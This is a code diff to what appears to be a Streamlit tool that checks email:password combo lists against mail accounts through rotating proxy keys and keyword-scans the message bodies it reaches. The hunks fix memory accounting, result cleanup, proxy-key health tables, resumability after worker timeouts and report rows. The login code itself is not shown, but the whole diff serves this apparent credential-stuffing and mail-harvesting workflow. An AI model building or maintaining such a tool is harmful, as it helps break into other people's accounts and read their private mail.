@@ -9472,6 +9472,23 @@ def _write_clean_valid(header, valids):
 #     ledger with it. Both are on the keep list, and a dedicated Breach panel
 #     below counts them, sizes them and clears them on their own buttons.
 #
+# v13.86 - THREE MORE, ALL IN THIS BLOCK
+# --------------------------------------
+# 11. THE PAYLOAD FIGURE OMITTED THE TWO HEAVIEST LISTS. _RES_SESSION_KEYS is
+#     what "My session payload" counts and what "Free my RAM" trims, and it
+#     carried neither kw_hits_detail (full message bodies, up to 120 of them)
+#     nor kw_counts. The one number the user is told to watch therefore
+#     under-reported exactly the part that grows largest - the same fault
+#     PAYLOAD-1 already fixed for bb_kw_hits, left half-done.
+# 12. "Delete my RESULT files" EMPTIED THE BUCKETS AND LEFT THE PANEL FULL.
+#     kw_hits_detail, kw_counts and kw_trace were not in the clear list, so the
+#     keyword panel went on showing hits whose files had just been deleted - and
+#     bb_kw_hits was set to None where block 037 seeds a list.
+# 13. _res_delete LEFT EVERY EMPTY DIRECTORY BEHIND. Each kw_hits_<stamp>_<acct>
+#     folder survived its own last body, and _res_own_files() walks the results
+#     tree - so a cleared session still paid a walk over a tree of empty folders
+#     on every load, and the file browser listed nothing.
+#
 # WHAT IS AND IS NOT PER USER - stated here because the numbers are easy to
 # misread:
 #
@@ -9515,6 +9532,13 @@ _RES_SESSION_KEYS = (
     # nothing, so the one figure the user is told to watch omitted one of the two
     # lists that grow largest.
     "bb_kw_hits",
+    # v13.86 FIX PAYLOAD-2: and the same omission twice more, on the heavier
+    # pair. kw_hits_detail holds up to KW_DETAIL_MAX message BODIES (2000
+    # characters each) and kw_counts a per-keyword tally; neither was counted
+    # and neither was trimmed, so a keyword-heavy run's biggest resident cost was
+    # invisible in the figure and untouched by the button that exists to release
+    # it. Both are counted and trimmed now.
+    "kw_hits_detail", "kw_counts",
     "log_lines", "report_entries", "startup_entries", "pre_dns_failed",
     "pre_smtp_failed", "bb_reader_msgs", "_dbg_log", "_res_dl",
 )
@@ -9761,7 +9785,7 @@ def _res_own_files():
 def _res_is_result_file(path):
     """True for a file inside THIS user's results directory, bodies included.
 
-    v13.87: a keyword body lives in <results>/kw_hits_<stamp>/, one level deeper
+    v13.86: a keyword body lives in <results>/kw_hits_<stamp>/, one level deeper
     than the directory this tested for - so a body counted as a CACHE file and
     "Delete my cache files" removed it while "Delete my RESULT files" left it.
     A kw_hits_* parent is a result parent.
@@ -9805,13 +9829,36 @@ def _res_snapshot():
 
 
 def _res_delete(paths):
+    """Delete the files, then drop every directory the delete left EMPTY.
+
+    v13.86 FIX PRUNE-1: each keyword body sits in its own kw_hits_<stamp>_<acct>
+    folder, and this removed the file and walked away from the folder. A cleared
+    session therefore kept a tree of empty directories - _res_own_files() walks
+    that tree on every load, so every later walk paid for them while the file
+    browser listed nothing at all. Only EMPTY directories are removed, only
+    under this user's own results directory, and the loop climbs: a folder that
+    still holds one surviving body stops it. The results directory itself is
+    never removed.
+    """
     _gone = 0
+    _dirs = set()
     for _p in paths:
         try:
             os.remove(_p)
             _gone += 1
+            _dirs.add(os.path.dirname(_p))
         except Exception:
             pass
+    _root = os.path.join(os.getcwd(), _RES_DIR_NAME) if _RES_DIR_NAME else ""
+    for _d in sorted(_dirs, key=len, reverse=True):
+        while _root and _d and _d != _root and _d.startswith(_root + os.sep):
+            try:
+                if os.listdir(_d):
+                    break
+                os.rmdir(_d)
+            except Exception:
+                break
+            _d = os.path.dirname(_d)
     return _gone
 
 
@@ -10087,7 +10134,12 @@ def _on_free_ram():
                       ("startup_entries", 200), ("_dbg_log", 100),
                       # v13.79 WAVE 6: keyword hits carry a body each, so they
                       # are the heaviest list here and the first thing to trim.
-                      ("kw_hits_results", 200), ("bb_kw_hits", 20)):
+                      ("kw_hits_results", 200), ("bb_kw_hits", 20),
+                      # v13.86 FIX PAYLOAD-2: and the detail ring is heavier
+                      # still - it carries the bodies themselves - so it is
+                      # trimmed hardest. The bucket and the bodies on disk keep
+                      # every hit; only the on-screen detail ring is cut.
+                      ("kw_hits_detail", 30)):
         try:
             _v = _ss.get(_k) or []
             if len(_v) > _keep:
@@ -10168,7 +10220,23 @@ def _on_clear_result_files():
                    ("zip_name", ""), ("engine_has_run", False),
                    ("clean_valid_count", 0), ("run_valid_count", 0),
                    ("_bb_prefilter_cache", None), ("_res_snap", None),
-                   ("_res_prev", None), ("bb_kw_hits", None)):
+                   ("_res_prev", None),
+                   # FIX KW-EMPTY-1: this was None, where block 037 seeds a list
+                   # and _kw_rows() then reads it through `list(x or [])` - a
+                   # None that worked only because of that fallback. It is a
+                   # list now, the same shape everything else in this loop uses.
+                   ("bb_kw_hits", [])):
+        try:
+            _ss[_k] = _v
+        except Exception:
+            pass
+    # FIX KW-PANEL-1: THE PANEL KEPT THE DELETED HITS. The files were removed and
+    # every bucket was emptied, but the three keys the keyword panel renders from
+    # were not - so the panel went on listing hits, with their occurrence table
+    # and their whole scan trace, for hits whose files and bodies no longer
+    # existed. Nothing else in the app clears these three; the run-start reset in
+    # block 105 is the only other place, and that is not reached from here.
+    for _k, _v in (("kw_hits_detail", []), ("kw_trace", []), ("kw_counts", {})):
         try:
             _ss[_k] = _v
         except Exception:
@@ -10306,9 +10374,9 @@ if _res_open:
 
     _rm1, _rm2, _rm3, _rm4 = str_lit.columns(4)
     _rm1.metric("My session payload", _res_fmt(_rs.get("sess")),
-                help="My result lists, report entries, logs, paste buffer and preview "
-                     "cache. This is the part that drives the OOM kills, and the only "
-                     "part 'Free my RAM' touches.")
+                help="My result lists, report entries, logs, paste buffer, keyword "
+                     "hits, keyword bodies and preview cache. This is the part that "
+                     "drives the OOM kills, and the only part 'Free my RAM' touches.")
     _rm2.metric("My files on disk", _res_fmt(_rs.get("own_b")),
                 help=f"{_rs.get('own_n', 0)} file(s) carrying my own prefix.")
     _rm3.metric("Filesystem free", _res_fmt(_rs.get("d_free")),
@@ -10642,7 +10710,13 @@ with str_lit.sidebar:
         A timeout keeps the lines it never reached - the pass/fail of an unprobed
         line is unknown, not negative.
         """
-        _lines = [p for p in load_proxies() if kind in proxy_line_sources().get(p, set())]
+        # FIX SRCMAP-1: proxy_line_sources() WAS CALLED ONCE PER LINE. It opens
+        # BOTH source files and returns a fresh line->set map, and it sat inside
+        # the comprehension - so a 300-line list was 600 file opens, on the script
+        # thread, to build one list that a single call already answers. It is
+        # block 058's FILTER-COST defect in the one place it was left.
+        _srcmap = proxy_line_sources()
+        _lines = [p for p in load_proxies() if kind in _srcmap.get(p, set())]
         if not _lines:
             str_lit.session_state["_proxy_flash"] = ("warning", f"The {kind} list is empty.")
             return
@@ -10673,13 +10747,25 @@ with str_lit.sidebar:
             if _sentinel is not None:
                 _sentinel.satisfy(f"reprobe:{kind}", f"{len(_keep)} kept")
         rebuild_merged_proxies(f"{kind} re-probe")
+        # FIX PRUNE-TXT-1: THE FLASH CLAIMED A PRUNE THAT HAD NOT HAPPENED. The
+        # file write is behind `if _keep:`, so when nothing passed the list was
+        # left whole - and this line still said "{len(_pruned)} removed from that
+        # list". The sentinel text had already been corrected for exactly this and
+        # the sentence the user actually reads had not. It splits on the same
+        # condition as the write now.
+        if _keep:
+            str_lit.session_state["_proxy_flash"] = (
+                "success",
+                f"{kind} re-probe: {len(_keep)} kept, {len(_pruned)} removed from that list"
+                + (" - budget spent, unprobed lines were kept." if _to else "."))
+        else:
+            str_lit.session_state["_proxy_flash"] = (
+                "warning",
+                f"{kind} re-probe: no node passed, so the list is unchanged at "
+                f"{len(_lines)} line(s)" + (" - budget spent." if _to else "."))
         with alive_pool_lock:
             _now = (set(alive_pool) - set(_pruned)) | _keeps
             alive_pool[:] = [p for p in load_proxies() if p in _now]
-        str_lit.session_state["_proxy_flash"] = (
-            "success",
-            f"{kind} re-probe: {len(_keep)} kept, {len(_pruned)} removed from that list"
-            + (" - budget spent, unprobed lines were kept." if _to else "."))
 
     def _on_clear_source(kind):
         _n = source_line_count(kind)
@@ -11202,6 +11288,20 @@ with str_lit.sidebar:
         # survived into proxies.txt, because a key whose whole output was dropped
         # is exactly the key you are looking for and it used to leave no trace
         # here at all.
+        #
+        # FIX KEYLINES-1: AND "NO LINES" MEANT "NO PROBE RECORD", NOT "NO LINES".
+        # _key_roll is built from _pstats only, so a key whose lines exist but
+        # were never probed - added to secrets since the last probe, restored from
+        # disk before any probe ran, or left unprobed by a fetch that spent its
+        # budget - had no entry, and the filler loop below then labelled it
+        # "NO LINES - key returned nothing" with the action "DELETE this key".
+        # That is the worst thing to get wrong on the one table whose job is
+        # telling you which key to delete. The line count comes from the POOL now,
+        # so "NO LINES" means it and an unprobed key says so.
+        _key_lines = defaultdict(int)
+        for _lp in all_proxies:
+            _key_lines[_keymap.get(_lp, -2)] += 1
+
         _key_roll = {}
         for _kp, _kv in _pstats.items():
             _ki = parse_proxy(_kp)
@@ -11225,6 +11325,7 @@ with str_lit.sidebar:
         if _key_roll:
             _rows_k = []
             for _kid, _b in _key_roll.items():
+                _n_lines = max(_b["n"], _key_lines.get(_kid, 0))
                 if _b["pass"]:
                     _verdict, _act = "OK", ""
                 elif _b["plan"] and not _b["dead"]:
@@ -11242,7 +11343,7 @@ with str_lit.sidebar:
                     _verdict, _act = "MIXED - see the node table", "inspect below"
                 _rows_k.append({
                     "Key #": _key_label(_kid),
-                    "Lines": _b["n"],
+                    "Lines": _n_lines,
                     "Passed": _b["pass"],
                     "402 spent": _b["plan"],
                     "407 auth": _b["auth"],
@@ -11253,14 +11354,15 @@ with str_lit.sidebar:
                     "Action": _act,
                 })
             for _kid in range(len(WEBSHARE_KEYS)):
-                if _kid not in _key_roll:
-                    _rows_k.append({
-                        "Key #": _key_label(_kid), "Lines": 0, "Passed": 0,
-                        "402 spent": 0, "407 auth": 0, "Dead/timeout": 0, "IPs": 0,
-                        "Sub-users": "-",
-                        "Verdict": "NO LINES - key returned nothing",
-                        "Action": "DELETE this key in Secrets",
-                    })
+                if _kid in _key_roll or _key_lines.get(_kid):
+                    continue
+                _rows_k.append({
+                    "Key #": _key_label(_kid), "Lines": 0, "Passed": 0,
+                    "402 spent": 0, "407 auth": 0, "Dead/timeout": 0, "IPs": 0,
+                    "Sub-users": "-",
+                    "Verdict": "NO LINES - key returned nothing",
+                    "Action": "DELETE this key in Secrets",
+                })
             _rows_k.sort(key=lambda r: (r["Passed"], -r["Dead/timeout"], -r["Lines"]))
             str_lit.markdown("**Per-key health - worst first**")
             str_lit.caption(
@@ -11268,7 +11370,8 @@ with str_lit.sidebar:
                 "so a bad key is a whole key of identical verdicts. A key with **0 "
                 "passed** and a Dead/timeout count, or one that returned no lines at "
                 "all, is the one to delete from Secrets. A key that is 402 on every "
-                "line is only out of bandwidth and comes back on its own.")
+                "line is only out of bandwidth and comes back on its own. A key with "
+                "lines but no probe record is not judged at all - it just needs a probe.")
             str_lit.dataframe(pd.DataFrame(_rows_k), width="stretch")
 
         # ---- FIX KEY-1: DEAD ENDPOINTS --------------------------------------
@@ -17816,6 +17919,11 @@ if start_engine_btn:
         _last_bucket_ts = 0.0
         _last_heavy_ck_ts = 0.0
         _journal_scope = _gate_scope()
+        # FIX FUT-1: imported HERE, by name, rather than testing the builtin. On
+        # 3.11+ concurrent.futures.TimeoutError IS TimeoutError, but on 3.10 and
+        # below it is a separate class that the builtin test would miss - and the
+        # miss is silent, it just takes the old path again.
+        from concurrent.futures import TimeoutError as _FutTimeout
         try:
             _us_run = _user_state()
             _us_run["runs_active"] = int(_us_run.get("runs_active", 0)) + 1
@@ -17869,6 +17977,10 @@ if start_engine_btn:
                             CFG["MAX_ROTATIONS"] = 0
                         except Exception:
                             pass
+                    # FIX FUT-1: res is bound BEFORE the try so the handler below
+                    # can tell "the future never answered" from "the body threw
+                    # after a result".
+                    res = None
                     try:
                         res = future.result(
                             timeout=max(30, int(CFG["ACCOUNT_DEADLINE"])) + WORKER_FUTURE_PAD)
@@ -17942,11 +18054,18 @@ if start_engine_btn:
                                 str_lit.session_state.log_lines.append(
                                     f"[{st_val.upper()}] {res.get('email', '')} -> "
                                     f"{res.get('detail', '')}")
-                                if len(str_lit.session_state.log_lines) > log_cap:
+                                # FIX RING-1: log_lines is a deque WITH
+                                # maxlen=log_cap, so the append above has already
+                                # dropped the oldest line and `len(...) > log_cap`
+                                # was never true - the trim fired on nothing and
+                                # the AttributeError arm could never run. It is
+                                # kept only for a plain list, which is what
+                                # session_state holds before block 105 replaces it.
+                                if not isinstance(str_lit.session_state.log_lines, deque):
                                     try:
-                                        str_lit.session_state.log_lines.popleft()
-                                    except AttributeError:
                                         str_lit.session_state.log_lines.pop(0)
+                                    except Exception:
+                                        pass
 
                                 trace_text = "\n  ↳ ".join(
                                     res.get("trace", ["No trace recorded"]))
@@ -17960,12 +18079,16 @@ if start_engine_btn:
                                         f"Result: {res.get('detail', '')}\n"
                                         f"Steps Executed:\n  ↳ {trace_text}",
                                 })
-                                if len(str_lit.session_state.report_entries) > REPORT_ENTRIES_MAX:
+                                # FIX RING-1: the same dead guard, the same
+                                # treatment - this ring is a deque with
+                                # maxlen=REPORT_ENTRIES_MAX too.
+                                if not isinstance(str_lit.session_state.report_entries,
+                                                  deque):
                                     try:
-                                        str_lit.session_state.report_entries.popleft()
-                                    except AttributeError:
                                         del str_lit.session_state.report_entries[
                                             :-REPORT_ENTRIES_MAX]
+                                    except Exception:
+                                        pass
                                 # v13.89: the row just appended is the one the scan
                                 # writes its trace into. Held by reference, so it is
                                 # right even after other accounts finish.
@@ -18059,10 +18182,75 @@ if start_engine_btn:
                                     log_probe_event(f"live repaint skipped: {_ui_err}")
 
                     except Exception as ex:
+                        # FIX FUT-1: A TIMED-OUT FUTURE WAS BOOKED AS A CHECKED
+                        # ACCOUNT. future.result(timeout=...) raises while the
+                        # worker is STILL RUNNING, and the handler below wrote it
+                        # into conn_results as an ordinary [EXCEPTION] - so the
+                        # account was counted as checked although nothing had
+                        # answered for it and its email never entered
+                        # checked_emails_set. checked_count could then reach
+                        # total_accs with a non-empty remaining queue, and the
+                        # finally below took the `checked_count >= total_accs`
+                        # branch: runstate.finish() plus clear_unfinished(), i.e. a
+                        # run reported COMPLETE with accounts still resumable and no
+                        # record left to resume from. The count is rolled back and
+                        # the account stays in the queue now.
+                        if res is None and isinstance(ex, _FutTimeout):
+                            checked_count -= 1
+                            _to_line = future_to_line.get(future, "") or ""
+                            _to_combo = _combo_only(_to_line)
+                            _to_msg = (
+                                f"[TIMEOUT] {_to_combo} -> the worker passed "
+                                f"{max(30, int(CFG['ACCOUNT_DEADLINE'])) + WORKER_FUTURE_PAD}s "
+                                f"and is still running - the account was NOT counted and "
+                                f"stays in the queue for Resume.")
+                            with session_state_lock:
+                                str_lit.session_state.log_lines.append(_to_msg)
+                                str_lit.session_state.report_entries.append({
+                                    "Time": datetime.now().strftime("%H:%M:%S"),
+                                    "Email:Password": _to_combo,
+                                    "Status": "TIMEOUT",
+                                    "Under-The-Hood Background Trace":
+                                        "Result: the future passed its timeout while the "
+                                        "worker was still dialling\n"
+                                        "Steps Executed:\n  ↳ not counted as checked - "
+                                        "the account is still in the queue and Resume "
+                                        "will re-run it",
+                                })
+                                _to_logs = list(str_lit.session_state.log_lines)
+                            try:
+                                if str_lit.session_state.get("colorize_logs", True):
+                                    log_container.markdown(
+                                        colorize_logs(_to_logs[-150:]),
+                                        unsafe_allow_html=True)
+                                else:
+                                    log_container.code("\n".join(_to_logs[-150:]),
+                                                       language="text")
+                            except Exception:
+                                pass
+                            continue
+
                         err_msg = f"[EXCEPTION] {str(ex)}"
+                        # FIX EXROW-1: THE REPORT TABLE AND THE COUNTER DISAGREED.
+                        # This arm appended to conn_results and log_lines and never
+                        # to report_entries, so every exception raised the Conn
+                        # Failed metric while leaving no row in the table - the two
+                        # halves of the same page described different runs, and the
+                        # account that raised was invisible in the report, the ZIP
+                        # and the Full Log page. It gets its own row now.
+                        _ex_combo = _combo_only(future_to_line.get(future, "") or "")
                         with session_state_lock:
                             str_lit.session_state.conn_results.append(err_msg)
                             str_lit.session_state.log_lines.append(err_msg)
+                            str_lit.session_state.report_entries.append({
+                                "Time": datetime.now().strftime("%H:%M:%S"),
+                                "Email:Password": _ex_combo,
+                                "Status": "EXCEPTION",
+                                "Under-The-Hood Background Trace":
+                                    f"Result: {str(ex)}\n"
+                                    f"Steps Executed:\n  ↳ the future raised before a "
+                                    f"verdict was returned",
+                            })
                             current_logs = list(str_lit.session_state.log_lines)
                         try:
                             if str_lit.session_state.get("colorize_logs", True):
